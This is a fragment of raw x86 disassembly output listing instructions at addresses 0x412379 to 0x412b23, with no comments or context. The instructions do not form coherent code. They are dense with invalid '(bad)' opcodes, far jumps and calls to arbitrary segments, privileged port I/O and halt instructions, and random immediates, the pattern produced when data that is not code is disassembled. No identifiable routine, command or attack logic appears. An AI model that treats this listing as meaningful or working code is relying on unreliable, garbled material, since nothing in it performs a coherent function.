  412379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41237a:	pop    esi
  41237b:	add    esp,DWORD PTR [eax-0x3c8d43ae]
  412381:	je     0x412398
  412383:	mov    ah,0x5
  412385:	pop    esi
  412386:	aaa    
  412387:	jmp    0x1d3a0128
  41238c:	dec    ecx
  41238d:	xchg   ecx,eax
  41238e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41238f:	ss fdecstp 
  412392:	mov    edx,0xcec3d14c
  412397:	adc    edx,ecx
  412399:	popa   
  41239a:	sti    
  41239b:	push   ecx
  41239c:	add    eax,0x91187c5e
  4123a1:	push   cs
  4123a2:	(bad)  
  4123a3:	cmp    ebx,ebp
  4123a5:	fistp  DWORD PTR ds:0xc52787d
  4123ab:	imul   esp,DWORD PTR [edi+0x93d3fe6],0x6c2a8bdb
  4123b5:	cld    
  4123b6:	or     al,0xff
  4123b8:	add    eax,0xa541956b
  4123bd:	inc    ecx
  4123be:	mov    al,0x11
  4123c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c1:	xchg   esi,eax
  4123c2:	push   es
  4123c3:	jecxz  0x4123be
  4123c5:	into   
  4123c6:	mov    eax,ds:0xfe15f479
  4123cb:	hlt    
  4123cc:	hlt    
  4123cd:	pop    ebx
  4123ce:	call   0x3d60:0x17fa7dca
  4123d5:	mov    al,ds:0x97bb95f
  4123da:	xor    eax,0x9a429ca1
  4123df:	and    eax,0x5b0de5ea
  4123e4:	and    ebx,DWORD PTR [edx+0x3c]
  4123e7:	mov    esp,0xcd42b3bf
  4123ec:	pop    ebx
  4123ed:	sbb    bh,BYTE PTR [eax+0x48]
  4123f0:	cmp    ebp,ecx
  4123f2:	in     al,dx
  4123f3:	cmc    
  4123f4:	out    0xab,eax
  4123f6:	pop    edx
  4123f7:	shl    BYTE PTR [ebx+0x4ea5013e],cl
  4123fd:	add    al,0x64
  4123ff:	int3   
  412400:	aas    
  412401:	mov    bl,0x71
  412403:	pop    ebx
  412404:	pop    esp
  412405:	xor    al,0xf2
  412407:	ja     0x4123bb
  412409:	dec    ebp
  41240a:	jae    0x412432
  41240c:	loop   0x412471
  41240e:	in     eax,dx
  41240f:	mov    DWORD PTR [ebx-0x1c],edi
  412412:	shl    BYTE PTR [edi-0x1a],0xe7
  412416:	pop    DWORD PTR [ebx+0x50]
  412419:	shr    BYTE PTR [edi+edx*1],1
  41241c:	add    BYTE PTR [eax-0x9c5c429],ah
  412422:	push   esi
  412423:	lods   eax,DWORD PTR ds:[esi]
  412424:	and    edx,eax
  412426:	mov    WORD PTR [ecx+0x53],es
  412429:	lock and dl,BYTE PTR [eax]
  41242c:	add    eax,0x10f6ead0
  412431:	xchg   ebx,eax
  412432:	push   ecx
  412433:	xor    DWORD PTR [edi+0x6a771910],esi
  412439:	add    ebp,DWORD PTR [ebp-0x4]
  41243c:	xor    BYTE PTR [eax],ah
  41243e:	jns    0x4123c4
  412440:	fidiv  DWORD PTR [ebx]
  412442:	call   0x8dfb:0xc9d61c8
  412449:	aaa    
  41244a:	add    al,0xf7
  41244c:	mov    BYTE PTR [edi+0x24],ah
  41244f:	mov    ecx,0xb07c44f7
  412454:	addr16 lahf 
  412456:	dec    edi
  412457:	xchg   ebx,eax
  412458:	(bad)  
  412459:	pusha  
  41245a:	pop    edi
  41245b:	cmp    esi,DWORD PTR [edx+0x6de20c2b]
  412461:	mov    bl,0x6e
  412463:	sbb    ebx,DWORD PTR [esi+0x51]
  412466:	xchg   esi,eax
  412467:	fcomp  DWORD PTR [eax]
  412469:	je     0x412484
  41246b:	dec    eax
  41246c:	jo     0x41249d
  41246e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41246f:	int    0x34
  412471:	and    al,0x5c
  412473:	mov    esp,0x4348a4d
  412478:	add    edx,DWORD PTR [ecx]
  41247a:	and    BYTE PTR [edi-0x3ac0595f],bh
  412480:	and    BYTE PTR [ebx+0x7f],ch
  412483:	imul   DWORD PTR [ecx-0x38aa08f0]
  412489:	repz add al,0x60
  41248c:	hlt    
  41248d:	push   ebx
  41248e:	test   al,0x32
  412490:	sub    esi,DWORD PTR [esi-0xd7ab63]
  412496:	sub    eax,esi
  412498:	ins    BYTE PTR es:[edi],dx
  412499:	pop    edx
  41249a:	jl     0x41245a
  41249c:	in     eax,0xce
  41249e:	mov    bh,0xd1
  4124a0:	xchg   edi,eax
  4124a1:	enter  0xd7ac,0x4e
  4124a5:	push   ds
  4124a6:	xchg   esp,eax
  4124a7:	ins    DWORD PTR es:[edi],dx
  4124a8:	std    
  4124a9:	test   DWORD PTR [eax+0x10],esp
  4124ac:	rcl    dh,cl
  4124ae:	xchg   DWORD PTR [edi-0x8],ebx
  4124b1:	jmp    0x31a3:0x92399b31
  4124b8:	and    ch,BYTE PTR [ecx+ebx*2+0x25]
  4124bc:	fs jo  0x412498
  4124bf:	adc    al,0xae
  4124c1:	jle    0x41253e
  4124c3:	pop    esp
  4124c4:	cdq    
  4124c5:	cdq    
  4124c6:	aas    
  4124c7:	fidivr DWORD PTR [ebp+ebp*4-0x199e5870]
  4124ce:	and    edi,DWORD PTR [ebp-0x36be669a]
  4124d4:	sub    DWORD PTR [esi*2-0x50164ec5],ebx
  4124db:	loope  0x41249f
  4124dd:	test   eax,0x42f04d8a
  4124e2:	jbe    0x412467
  4124e4:	dec    eax
  4124e5:	sbb    BYTE PTR [ecx],0xcc
  4124e8:	push   cs
  4124e9:	or     eax,0x59bb65a3
  4124ee:	adc    eax,0xd9d2cb1b
  4124f3:	lahf   
  4124f4:	repnz pop eax
  4124f6:	mov    bh,0x4c
  4124f8:	inc    edx
  4124f9:	jp     0x4124b7
  4124fb:	xchg   esi,eax
  4124fc:	fnstsw WORD PTR [edi+eiz*1+0xb]
  412500:	mov    al,ds:0x738f68e4
  412505:	out    dx,al
  412506:	jae    0x412553
  412508:	inc    edx
  412509:	test   BYTE PTR [esi],cl
  41250b:	inc    edx
  41250c:	xchg   DWORD PTR [esi-0x2b],esp
  41250f:	xchg   DWORD PTR [eax],eax
  412511:	in     eax,dx
  412512:	cmp    cl,bh
  412514:	cs enter 0xb1b6,0x1b
  412519:	adc    DWORD PTR [eax],ebx
  41251b:	into   
  41251c:	daa    
  41251d:	and    ecx,edx
  41251f:	mov    eax,ds:0xc2576566
  412524:	in     al,dx
  412525:	inc    ebp
  412526:	ret    
  412527:	or     BYTE PTR [ecx+ebp*2-0x42],ah
  41252b:	push   0x6d
  41252d:	mov    DWORD PTR [edx],esi
  41252f:	mov    ecx,0x441eaf34
  412534:	(bad)  
  412535:	jmp    0xb15e:0x165ae7bb
  41253c:	or     bh,BYTE PTR [eax-0x12]
  41253f:	jno    0x412527
  412541:	std    
  412542:	pop    esp
  412543:	push   edx
  412544:	cmp    eax,0x41dafde7
  412549:	fsub   DWORD PTR [edi]
  41254b:	dec    esi
  41254c:	push   ds
  41254d:	mov    dh,BYTE PTR [ebx-0x676d1487]
  412553:	setbe  BYTE PTR [esi+0x35]
  412557:	jne    0x4125bd
  412559:	lods   al,BYTE PTR ds:[esi]
  41255a:	mov    al,ds:0xff182252
  41255f:	xchg   DWORD PTR [eax-0x1ec396cd],ebx
  412565:	jns    0x4124e9
  412567:	adc    BYTE PTR [ebp+0x24],dh
  41256a:	push   cs
  41256b:	push   cs
  41256c:	pop    ecx
  41256d:	inc    edi
  41256e:	addr16 sub bh,ah
  412571:	xchg   ecx,eax
  412572:	scas   al,BYTE PTR es:[edi]
  412573:	dec    esp
  412574:	jo     0x4125d5
  412576:	jmp    0x16f4a18c
  41257b:	mov    ecx,0xf84df7bf
  412580:	cmc    
  412581:	xchg   ebx,eax
  412582:	fnstenv [esi-0x41808ab1]
  412588:	ror    esi,cl
  41258a:	mov    esi,0x79a35aa1
  41258f:	mov    al,ds:0xebf887f7
  412594:	and    ah,dh
  412596:	adc    esi,0xc29149c1
  41259c:	push   ds
  41259d:	mov    eax,ds:0x2c04c975
  4125a2:	bound  ebp,QWORD PTR [ebx+ebp*4]
  4125a5:	mov    dh,0x1b
  4125a7:	mov    edx,0x8717e65c
  4125ac:	ins    DWORD PTR es:[edi],dx
  4125ad:	loope  0x41260c
  4125af:	pop    ds
  4125b0:	xor    BYTE PTR [eax+0x204489ee],al
  4125b6:	in     eax,dx
  4125b7:	and    DWORD PTR [ebx],esp
  4125b9:	xor    esp,eax
  4125bb:	enter  0x5efd,0xe9
  4125bf:	adc    esp,DWORD PTR [edx-0x56]
  4125c2:	fild   DWORD PTR [edx-0x6b483285]
  4125c8:	je     0x412629
  4125ca:	cdq    
  4125cb:	loope  0x412623
  4125cd:	jg     0x412604
  4125cf:	rcr    BYTE PTR ds:0xa4d927ff,0x34
  4125d6:	xor    ebp,DWORD PTR [eax]
  4125d8:	dec    ecx
  4125d9:	xor    bl,BYTE PTR [ecx]
  4125db:	(bad)  
  4125dc:	pop    ebp
  4125dd:	or     esp,eax
  4125df:	cmp    eax,0x30193207
  4125e4:	xchg   esi,edx
  4125e6:	dec    ebp
  4125e7:	jb     0x412624
  4125e9:	lea    ebx,[esi-0xe]
  4125ec:	mov    al,ds:0x41cdcf72
  4125f1:	xlat   BYTE PTR ds:[ebx]
  4125f2:	or     al,0xb7
  4125f4:	out    0x9f,eax
  4125f6:	xchg   ecx,eax
  4125f7:	pop    eax
  4125f8:	pop    ds
  4125f9:	jmp    0x412660
  4125fb:	inc    eax
  4125fc:	loop   0x4125c8
  4125fe:	adc    cl,BYTE PTR [edi]
  412600:	inc    ebp
  412601:	std    
  412602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412603:	inc    edx
  412604:	add    BYTE PTR [eax+0x5bdc50e0],dh
  41260a:	and    bh,BYTE PTR [esi]
  41260c:	outs   dx,DWORD PTR ds:[esi]
  41260d:	jno    0x41262e
  41260f:	mov    eax,ds:0xc172bbb4
  412614:	fcomp  QWORD PTR [ecx]
  412616:	sbb    dh,dl
  412618:	cmp    eax,0xf397b840
  41261d:	xchg   ecx,eax
  41261e:	mov    ds:0x7fcf57dd,eax
  412623:	out    dx,eax
  412624:	aas    
  412625:	or     BYTE PTR [eax+0xab311cc],dl
  41262b:	das    
  41262c:	sub    eax,0x8259e52c
  412631:	arpl   WORD PTR [ebp+0x5c],dx
  412634:	fmul   QWORD PTR [edx+ecx*4+0x32]
  412638:	pop    edi
  412639:	xor    bl,0x5
  41263c:	out    0x7a,eax
  41263e:	xlat   BYTE PTR ds:[ebx]
  41263f:	xchg   ebp,eax
  412640:	xchg   BYTE PTR [edi],dl
  412642:	repz inc esp
  412644:	aam    0xbf
  412646:	or     al,0x43
  412648:	dec    ebp
  412649:	ins    DWORD PTR es:[edi],dx
  41264a:	repnz push edi
  41264c:	cmp    DWORD PTR [esp+eax*4+0x1da6bdf1],0xffffffcf
  412654:	mov    ds,WORD PTR ds:0x14b6a43e
  41265a:	aad    0xfb
  41265c:	or     al,0x37
  41265e:	xchg   edx,eax
  41265f:	data16 xor bl,BYTE PTR [esi+eiz*4-0x38b0432b]
  412667:	pusha  
  412668:	mov    al,0xc4
  41266a:	pusha  
  41266b:	aas    
  41266c:	push   esp
  41266d:	push   ebp
  41266e:	jns    0x412613
  412670:	mov    eax,ds:0x1e45c0e2
  412675:	shl    al,0xdf
  412678:	or     ebp,DWORD PTR [edi-0x51]
  41267b:	dec    edx
  41267c:	dec    ebx
  41267d:	mov    dl,0xef
  41267f:	leave  
  412680:	cmp    cl,al
  412682:	sahf   
  412683:	mov    cl,0x91
  412685:	loopne 0x4126ce
  412687:	xor    al,0xe4
  412689:	lea    ebx,[edx-0x75]
  41268c:	mov    esp,DWORD PTR [ebp+esi*2-0x80]
  412690:	jo     0x41263d
  412692:	push   edi
  412693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412694:	ins    BYTE PTR es:[edi],dx
  412695:	add    DWORD PTR [esi-0x1894b5b0],edx
  41269b:	pop    ss
  41269c:	loopne 0x4126bd
  41269e:	add    eax,0x91781789
  4126a3:	mul    esi
  4126a5:	sub    eax,0x16
  4126a8:	push   esp
  4126a9:	sbb    ah,ah
  4126ab:	iret   
  4126ac:	scas   al,BYTE PTR es:[edi]
  4126ad:	repz loope 0x4126f5
  4126b0:	std    
  4126b1:	enter  0xbea7,0x70
  4126b5:	das    
  4126b6:	outs   dx,BYTE PTR ds:[esi]
  4126b7:	mov    ds:0xf0676215,eax
  4126bc:	lock adc ebx,eax
  4126bf:	lods   al,BYTE PTR ds:[esi]
  4126c0:	cwde   
  4126c1:	mov    ds:0x72c92b2a,al
  4126c6:	add    BYTE PTR [edx-0x46],0xcb
  4126ca:	(bad)  
  4126cb:	mov    edx,DWORD PTR [ebx+0x4f16c1e3]
  4126d1:	xor    ah,0x49
  4126d4:	fcmovnb st,st(4)
  4126d6:	or     DWORD PTR [edx-0x45c5981],esi
  4126dc:	inc    edi
  4126dd:	(bad)  
  4126de:	nop
  4126df:	loopne 0x412750
  4126e1:	mov    eax,0x5dd0211a
  4126e6:	push   eax
  4126e7:	mov    ebp,0xcb46cf4c
  4126ec:	xchg   ecx,eax
  4126ed:	sti    
  4126ee:	and    eax,0x61eb8d83
  4126f3:	pop    edi
  4126f4:	inc    ebx
  4126f5:	jp     0x4126b1
  4126f7:	dec    ebp
  4126f8:	std    
  4126f9:	retf   0x7d6
  4126fc:	out    dx,al
  4126fd:	pusha  
  4126fe:	xor    eax,0x2e894021
  412703:	clc    
  412704:	fmul   st,st(3)
  412706:	dec    edx
  412707:	jmp    0x4126b7
  412709:	adc    eax,0x5c68ae1c
  41270e:	mov    edx,0xc84db2e4
  412713:	repnz mov BYTE PTR [edi],ch
  412716:	adc    cl,BYTE PTR ds:0xe942f39f
  41271c:	sar    DWORD PTR ds:0xee8157c6,1
  412722:	pop    edi
  412723:	add    BYTE PTR [edx],cl
  412725:	ja     0x412776
  412727:	sbb    al,0x29
  412729:	cmp    eax,0xa71be29f
  41272e:	sbb    DWORD PTR [ebx+eax*4],edx
  412731:	scas   eax,DWORD PTR es:[edi]
  412732:	dec    esp
  412733:	mov    bh,0x38
  412735:	rcl    BYTE PTR [esp+ebp*1],1
  412738:	std    
  412739:	and    cl,BYTE PTR [esi-0x5ff866e4]
  41273f:	jg     0x4126d9
  412741:	cmp    edx,DWORD PTR [ecx-0xc4a758]
  412747:	pusha  
  412748:	loope  0x412799
  41274a:	pop    ebx
  41274b:	mov    ebp,0x5b4ed708
  412750:	mov    DWORD PTR [ebx+0x34],edi
  412753:	pop    ebx
  412754:	and    DWORD PTR [edi],ebp
  412756:	outs   dx,DWORD PTR ds:[esi]
  412757:	jbe    0x4127a6
  412759:	out    dx,eax
  41275a:	xor    DWORD PTR [ecx+0x11],eax
  41275d:	out    0xb4,al
  41275f:	iret   
  412760:	lods   al,BYTE PTR ds:[esi]
  412761:	mov    BYTE PTR [edx],al
  412763:	mov    dl,0x7c
  412765:	mov    edi,0x46e1e25
  41276a:	mov    al,0x1f
  41276c:	xchg   ebx,eax
  41276d:	mov    DWORD PTR [ecx],edx
  41276f:	add    ecx,DWORD PTR [ebp-0x787cfa9b]
  412775:	mov    al,0xe7
  412777:	aad    0x86
  412779:	fst    DWORD PTR [edx+0x2d]
  41277c:	mov    ds:0xa3cb3ca8,eax
  412781:	cmp    DWORD PTR [ebx],edx
  412783:	or     al,0x2a
  412785:	call   0xc88e:0xe81d3226
  41278c:	in     eax,0xce
  41278e:	out    dx,al
  41278f:	mov    ebx,0xdc2a0962
  412794:	or     edi,DWORD PTR [ebx-0x13]
  412797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412798:	aam    0x5c
  41279a:	out    0x1b,eax
  41279c:	jns    0x412736
  41279e:	xchg   ebx,eax
  41279f:	ss xor eax,0x35e1946b
  4127a5:	inc    ecx
  4127a6:	jmp    0x4f22:0xc71bd88
  4127ad:	fldcw  WORD PTR ds:0x627675ac
  4127b3:	lahf   
  4127b4:	inc    ebx
  4127b6:	push   0x65
  4127b8:	ret    
  4127b9:	fucomi st,st(4)
  4127bb:	ret    
  4127bc:	jmp    FWORD PTR [ecx+0x58b33f95]
  4127c2:	das    
  4127c3:	sbb    DWORD PTR [eax+0x4d3b224e],ecx
  4127c9:	jge    0x4127e9
  4127cb:	cwde   
  4127cc:	mov    ecx,0x606affee
  4127d1:	cmp    al,0x1f
  4127d3:	cli    
  4127d4:	jne    0x412845
  4127d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127d7:	mov    dh,0xc2
  4127d9:	xor    esi,ecx
  4127db:	je     0x412816
  4127dd:	mov    DWORD PTR [ebx+eax*8],ebx
  4127e0:	add    ch,BYTE PTR [eax+0x17]
  4127e3:	mov    DWORD PTR [ebx],ebp
  4127e5:	mov    ds:0x4a0eb7e6,al
  4127ea:	add    dh,bh
  4127ec:	dec    ebp
  4127ed:	sti    
  4127ee:	iret   
  4127ef:	loop   0x412862
  4127f1:	add    al,0x71
  4127f3:	(bad)  
  4127f5:	lea    eax,[eax+0x3d]
  4127f8:	rol    BYTE PTR [ecx],1
  4127fa:	jecxz  0x4127d9
  4127fc:	ror    DWORD PTR [edi],0x58
  4127ff:	add    DWORD PTR [esi+0x527bc0ba],esp
  412805:	and    eax,DWORD PTR gs:[edx]
  412808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412809:	mov    ch,0x22
  41280b:	add    bl,ch
  41280d:	stos   BYTE PTR es:[edi],al
  41280e:	jnp    0x4127d5
  412810:	repz out 0x9,eax
  412813:	test   eax,0xa6b16b75
  412818:	pusha  
  412819:	mov    al,0x4e
  41281b:	call   0xcf924c99
  412820:	mov    esp,0x4f34cef9
  412825:	mov    bl,0x85
  412827:	loopne 0x412855
  412829:	push   ebp
  41282a:	pop    edi
  41282b:	xchg   edi,eax
  41282c:	inc    eax
  41282d:	sub    al,0xbc
  41282f:	in     al,dx
  412830:	xchg   ebx,eax
  412831:	hlt    
  412832:	and    BYTE PTR [ebp+0x68db8ab3],bh
  412838:	dec    edx
  412839:	cld    
  41283a:	pushf  
  41283b:	out    dx,eax
  41283c:	push   esi
  41283d:	(bad)  
  41283e:	mov    esi,0x8981c4e8
  412843:	call   0x25d6d7f
  412848:	repnz pop ds
  41284a:	jae    0x41282e
  41284c:	dec    ebp
  41284d:	inc    esp
  41284e:	pop    ecx
  41284f:	mov    BYTE PTR [ecx],bl
  412851:	sbb    al,0x94
  412853:	pop    ds
  412854:	fisubr WORD PTR [ecx+0x32aef59d]
  41285a:	inc    esi
  41285b:	mov    ebx,0x2347fcb5
  412860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412861:	sub    eax,0x29f78eea
  412866:	inc    esi
  412867:	and    al,0x9
  412869:	fsubr  st,st(4)
  41286b:	bound  ecx,QWORD PTR ds:0x4f9ec328
  412871:	outs   dx,BYTE PTR ds:[esi]
  412872:	int    0xae
  412874:	mov    ah,0xed
  412876:	(bad)  
  412878:	mov    eax,ds:0x185b7e96
  41287d:	push   esi
  41287e:	lahf   
  41287f:	push   ds
  412880:	xchg   ebp,eax
  412881:	xor    dl,BYTE PTR [eax]
  412883:	jne    0x4128f3
  412885:	add    BYTE PTR [ebx],bl
  412887:	das    
  412888:	or     dl,BYTE PTR [eax+0x18d9e540]
  41288e:	popf   
  41288f:	stos   BYTE PTR es:[edi],al
  412890:	scas   eax,DWORD PTR es:[edi]
  412891:	leave  
  412892:	sbb    eax,0x85f8099b
  412897:	test   BYTE PTR [esi-0x41],dl
  41289a:	mov    BYTE PTR [edx+ebx*1],bh
  41289d:	(bad)  
  41289f:	leave  
  4128a0:	pop    esp
  4128a1:	loopne 0x412920
  4128a3:	shr    BYTE PTR [ecx+0x31],0xa3
  4128a7:	fiadd  DWORD PTR [ebx+0x1f]
  4128aa:	icebp  
  4128ab:	push   edi
  4128ac:	add    edx,edx
  4128ae:	sub    esi,ecx
  4128b0:	mov    cs,WORD PTR [edi-0xd20e337]
  4128b6:	mov    bh,0xd7
  4128b8:	xchg   esp,eax
  4128b9:	cmp    BYTE PTR [eax+edx*1-0x4fadd9c8],dl
  4128c0:	and    BYTE PTR [eax+0x1d3d0d4c],dh
  4128c6:	int    0xfd
  4128c8:	sub    al,0x84
  4128ca:	add    dh,BYTE PTR [edx-0x20]
  4128cd:	shl    DWORD PTR [ebx+0x61],cl
  4128d0:	push   edi
  4128d1:	les    ebp,FWORD PTR [edi+0x7f11e185]
  4128d7:	in     eax,dx
  4128d8:	cmc    
  4128d9:	jmp    0xed63:0xfebf3b02
  4128e0:	js     0x4128b3
  4128e2:	lods   al,BYTE PTR ds:[esi]
  4128e3:	iret   
  4128e4:	or     edx,ebp
  4128e6:	dec    eax
  4128e7:	cdq    
  4128e8:	pop    es
  4128e9:	imul   eax,esp,0x72f83e28
  4128ef:	into   
  4128f0:	outs   dx,BYTE PTR ds:[esi]
  4128f1:	lahf   
  4128f2:	mov    bh,0x5c
  4128f4:	xor    bl,ah
  4128f6:	mov    cl,0xaa
  4128f8:	jl     0x412901
  4128fa:	rol    edi,cl
  4128fc:	lods   al,BYTE PTR ds:[esi]
  4128fd:	mov    eax,edi
  4128ff:	in     eax,dx
  412900:	adc    esp,DWORD PTR [ebx-0x2]
  412903:	adc    DWORD PTR [edx+ebx*2-0x3a],ecx
  412907:	call   0xdbd929e9
  41290c:	push   edx
  41290d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290e:	into   
  41290f:	bound  eax,QWORD PTR [esi-0x2fb5d101]
  412915:	pop    es
  412916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412917:	std    
  412918:	push   edx
  412919:	xor    bh,ch
  41291b:	jle    0x412953
  41291d:	add    ebp,edx
  41291f:	sub    BYTE PTR [esi+0x76],ah
  412922:	mov    dh,0x54
  412924:	inc    ecx
  412925:	jecxz  0x412970
  412927:	addr16 iret 
  412929:	dec    ebp
  41292a:	in     eax,0x4b
  41292c:	rcl    BYTE PTR [esi],0xd0
  41292f:	mov    cs,WORD PTR [ebx]
  412931:	pop    eax
  412932:	push   ss
  412933:	fnstcw WORD PTR [eax+0x32e42199]
  412939:	lods   al,BYTE PTR ds:[esi]
  41293a:	daa    
  41293b:	adc    BYTE PTR es:[ebp+0x4fd16007],al
  412942:	dec    ebp
  412943:	loop   0x41296d
  412945:	sahf   
  412946:	fst    st(1)
  412948:	out    0x77,eax
  41294a:	out    0x4d,eax
  41294c:	add    ch,dl
  41294e:	xchg   esi,eax
  41294f:	scas   eax,DWORD PTR es:[edi]
  412950:	or     BYTE PTR [edx+eax*8-0x23],bl
  412954:	cld    
  412955:	pop    ebp
  412956:	clc    
  412957:	mov    ch,0x15
  412959:	repz pushf 
  41295b:	cli    
  41295c:	and    al,0xf4
  41295e:	jnp    0x4129a9
  412960:	cli    
  412961:	(bad)  
  412962:	outs   dx,DWORD PTR ds:[esi]
  412963:	mov    DWORD PTR [ebx],edx
  412965:	xchg   BYTE PTR [eax+ebp*1-0x5f],ch
  412969:	sub    cl,BYTE PTR [eax-0x2db73d01]
  41296f:	aas    
  412970:	sub    dl,dl
  412972:	int3   
  412973:	daa    
  412974:	push   ebp
  412975:	inc    edx
  412976:	in     al,dx
  412977:	cwde   
  412978:	js     0x412915
  41297a:	add    eax,0x49fb9440
  41297f:	outs   dx,DWORD PTR ds:[esi]
  412980:	push   cs
  412981:	mov    dh,0x26
  412983:	sub    al,0x80
  412985:	jns    0x41293e
  412987:	pop    esp
  412988:	repz in al,0xeb
  41298b:	daa    
  41298c:	rol    dl,1
  41298e:	pop    ebx
  41298f:	fisttp DWORD PTR [esi-0x27f81de3]
  412995:	and    al,0x31
  412997:	loop   0x41296b
  412999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299a:	call   DWORD PTR [ebx]
  41299c:	push   eax
  41299d:	sub    DWORD PTR [ebx],ecx
  41299f:	or     al,0x77
  4129a1:	pop    edx
  4129a2:	push   es
  4129a3:	mov    cl,0x6b
  4129a5:	addr16 push es
  4129a7:	int    0x50
  4129a9:	ret    
  4129aa:	test   edx,0x85102369
  4129b0:	outs   dx,BYTE PTR ds:[esi]
  4129b1:	pop    ebp
  4129b2:	mov    bl,0x86
  4129b4:	mov    BYTE PTR [edx-0x59],ch
  4129b7:	jno    0x412a14
  4129b9:	sahf   
  4129ba:	sub    BYTE PTR [eax],0xfb
  4129bd:	mov    edx,0x9005aad9
  4129c2:	mov    al,ds:0xdfed2ec6
  4129c7:	scas   al,BYTE PTR es:[edi]
  4129c8:	ss pop ebp
  4129ca:	mov    ebx,0x9a1af7e7
  4129cf:	mov    ebx,0xf4309f33
  4129d4:	in     eax,dx
  4129d5:	out    dx,al
  4129d6:	and    dl,BYTE PTR [eax-0x6]
  4129d9:	mov    ch,0x22
  4129db:	xor    ch,bh
  4129dd:	call   0x96b4:0x4e7b01ba
  4129e4:	fsub   DWORD PTR [edx+0x70]
  4129e7:	xchg   DWORD PTR [ecx],esp
  4129e9:	mov    ebp,0x331abd2c
  4129ee:	push   ebx
  4129ef:	lea    ebp,[eax]
  4129f1:	arpl   WORD PTR [esi-0x65],cx
  4129f4:	mov    eax,ds:0x8cfe0ed8
  4129f9:	(bad)  
  4129fc:	xor    eax,0x8b087d88
  412a01:	je     0x412a1e
  412a03:	jg     0x4129ff
  412a05:	(bad)  
  412a06:	mov    bl,0x2
  412a08:	xchg   ebx,eax
  412a09:	leave  
  412a0a:	jae    0x412a1d
  412a0c:	push   esp
  412a0d:	js     0x412a56
  412a0f:	fcom   QWORD PTR [ecx-0x4e]
  412a12:	int    0xd2
  412a14:	addr16 loop 0x412a0c
  412a17:	and    dh,ah
  412a19:	jmp    0x412a33
  412a1b:	sbb    BYTE PTR [eax+ebx*1],ch
  412a1e:	inc    edi
  412a1f:	test   eax,0x8ada8001
  412a24:	add    ch,BYTE PTR [edx+0x7d]
  412a27:	inc    ecx
  412a28:	call   0x33eea1a5
  412a2d:	test   BYTE PTR [ebx+0x589c3fe9],dl
  412a33:	mov    al,0x85
  412a35:	call   0x1173:0x9473233b
  412a3c:	bound  edx,QWORD PTR [edx]
  412a3e:	out    dx,eax
  412a3f:	and    BYTE PTR [ebx],bh
  412a41:	xlat   BYTE PTR ds:[ebx]
  412a42:	xlat   BYTE PTR ds:[ebx]
  412a43:	push   ebx
  412a44:	mov    cl,ah
  412a46:	cmc    
  412a47:	das    
  412a48:	xlat   BYTE PTR ds:[ebx]
  412a49:	sbb    eax,0x1b8feb18
  412a4e:	add    eax,0x2d407497
  412a53:	in     al,dx
  412a54:	imul   ecx,esp,0xfb9f6126
  412a5a:	push   ss
  412a5b:	jmp    0xd156:0x140fa2d7
  412a62:	or     BYTE PTR [ecx],dh
  412a64:	dec    eax
  412a65:	pop    eax
  412a66:	mov    ecx,DWORD PTR ds:0xe4afe53d
  412a6c:	xor    BYTE PTR [ecx],ah
  412a6e:	xor    eax,DWORD PTR [edi]
  412a70:	xchg   edx,eax
  412a71:	inc    esi
  412a72:	aaa    
  412a73:	pop    ss
  412a74:	mov    eax,ds:0x32c0fdd4
  412a79:	mov    al,0x8f
  412a7b:	sbb    BYTE PTR [edi+0x3e88e508],bh
  412a81:	mov    ds:0x98c9f77,eax
  412a86:	shr    ch,1
  412a88:	mov    gs,edx
  412a8a:	in     eax,dx
  412a8b:	sbb    DWORD PTR [esp+eax*8+0x3f9fc75],esi
  412a92:	jmp    0xbf13:0x46308c32
  412a99:	jg     0x412a31
  412a9b:	dec    ebp
  412a9c:	lods   al,BYTE PTR ds:[esi]
  412a9d:	outs   dx,DWORD PTR ds:[esi]
  412a9e:	jne    0x412a80
  412aa0:	iret   
  412aa1:	dec    edi
  412aa2:	and    al,0xe0
  412aa4:	das    
  412aa5:	xchg   esi,eax
  412aa6:	xchg   ebx,eax
  412aa7:	loope  0x412a64
  412aa9:	sbb    al,0x2e
  412aab:	fadd   QWORD PTR [edx+0x1df8c179]
  412ab1:	es push es
  412ab3:	loop   0x412b09
  412ab5:	call   0x2a79:0xdfc8d0a7
  412abc:	dec    edi
  412abd:	and    DWORD PTR [esi+0x457a8946],edx
  412ac3:	cmp    eax,DWORD PTR [edi]
  412ac5:	arpl   di,sp
  412ac7:	popf   
  412ac8:	cld    
  412ac9:	popf   
  412aca:	cld    
  412acb:	dec    edx
  412acc:	xor    edi,edx
  412ace:	rcr    DWORD PTR [edx-0x76],cl
  412ad1:	pop    es
  412ad2:	push   ebx
  412ad3:	(bad)  
  412ad5:	neg    DWORD PTR [edi+0x5e]
  412ad8:	inc    eax
  412ad9:	cmp    al,0x89
  412adb:	mov    dh,0xb
  412add:	inc    eax
  412ade:	das    
  412adf:	cmc    
  412ae0:	loopne 0x412b47
  412ae2:	iret   
  412ae3:	test   BYTE PTR [ebp-0x66],0x52
  412ae7:	stos   DWORD PTR es:[edi],eax
  412ae8:	cmp    ch,ah
  412aea:	ss sub eax,0xd5f5e576
  412af0:	sbb    BYTE PTR [edx],bh
  412af2:	mov    esp,0x1ad8469f
  412af7:	popf   
  412af8:	cmp    BYTE PTR [ebx+0x6d],bl
  412afb:	mul    DWORD PTR [ebp+0x52c5a52c]
  412b01:	loope  0x412b39
  412b03:	push   ecx
  412b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b05:	les    ebp,FWORD PTR [esi+0x3cb991aa]
  412b0b:	inc    edx
  412b0c:	add    BYTE PTR [ecx],0x60
  412b0f:	jmp    0x73d1:0x57cbeef0
  412b16:	test   al,0x8
  412b18:	mov    eax,0x2f38c156
  412b1d:	pop    ebp
  412b1e:	ins    DWORD PTR es:[edi],dx
  412b1f:	test   ah,al
  412b21:	dec    esi
  412b22:	pop    edx
  412b23:	fwait
